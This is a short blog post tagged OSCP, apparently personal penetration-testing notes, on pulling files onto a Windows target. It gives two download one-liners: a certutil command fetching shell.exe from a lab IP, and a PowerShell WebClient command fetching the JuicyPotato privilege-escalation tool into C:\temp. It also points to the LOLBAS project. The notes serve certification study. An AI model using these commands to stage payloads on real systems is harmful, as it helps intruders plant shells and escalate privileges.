---
layout: post
title: Download Files Windows
date: 2021-06-29 13:51
author: frank
comments: true
categories: [OSCP]
---
<div style="direction: ltr; border-width: 100%;">
<div style="direction: ltr; margin-top: 0in; margin-left: 0in; width: 9.0097in;">
<div style="direction: ltr; margin-top: 0in; margin-left: 0in; width: 9.0097in;">
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"><span style="font-weight: bold;">Download Files Windows</span></p>
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"></p>
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;">Download Files with Certutil</p>
<p lang="en-US" style="margin: 0in; margin-left: .375in; font-family: Calibri; font-size: 11.0pt;">certutil.exe -urlcache -f <a href="http://10.10.14.13/cve-2016-7255.exe">http://10.9.218.104/</a>shell.exe shell.exe</p>
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"></p>
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"></p>
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;"></p>
<p lang="en-US" style="margin: 0in; font-family: Calibri; font-size: 11.0pt;">Using Powershell to download files to Windows</p>
<p lang="en-US" style="margin: 0in; margin-left: .375in; font-family: Calibri; font-size: 11.0pt;">powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.35/JuicyPotato.exe','C:\temp\JuicyPotato.exe')"</p>

</div>
</div>
</div>
<p lang="en-US"></p>
<p lang="en-US">Also Great resource</p>
https://lolbas-project.github.io/
